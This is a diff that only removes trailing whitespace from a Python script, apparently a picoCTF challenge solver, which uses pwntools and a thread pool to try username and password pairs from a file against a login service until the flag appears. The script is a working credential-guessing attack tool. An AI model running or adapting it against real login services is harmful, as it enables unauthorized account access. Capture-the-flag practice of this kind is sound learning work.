@@ -29,28 +29,28 @@ found_event = threading.Event()
 def attempt_login(index, total, username, password):
     if found_event.is_set():
         return
-    
+
     try:
-        io = remote(HOST, PORT, level='error') 
-        
+        io = remote(HOST, PORT, level='error')
+
         io.recvuntil(b'Username: ', timeout=2)
         io.sendline(username.encode())
-        
+
         io.recvuntil(b'Password: ', timeout=2)
         io.sendline(password.encode())
-        
+
         response = io.recvall(timeout=1)
         io.close()
-        
+
         if b'Invalid' not in response and b'picoCTF' in response:
-            found_event.set() 
+            found_event.set()
             print(f"\nSUCCESS")
             print(f"User: {username}")
             print(f"Pass: {password}")
             print(f"Response:\n{response.decode().strip()}")
         else:
             print(f"[{index}/{total}] Tried: {username}:{password}")
-            
+
     except Exception as e:
         print(f"[{index}/{total}] [!] Error: {username} ({e})")
 
@@ -64,21 +64,21 @@ def main():
 
     creds = []
     for line in lines:
-        if not line.strip(): 
+        if not line.strip():
             continue
         try:
             u, p = line.strip().split(';')
             creds.append((u, p))
         except ValueError:
             continue
-            
+
     total = len(creds)
 
     with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
         futures = []
         for i, (username, password) in enumerate(creds, 1):
             futures.append(executor.submit(attempt_login, i, total, username, password))
-            
+
         concurrent.futures.wait(futures)
 
 if __name__ == '__main__':
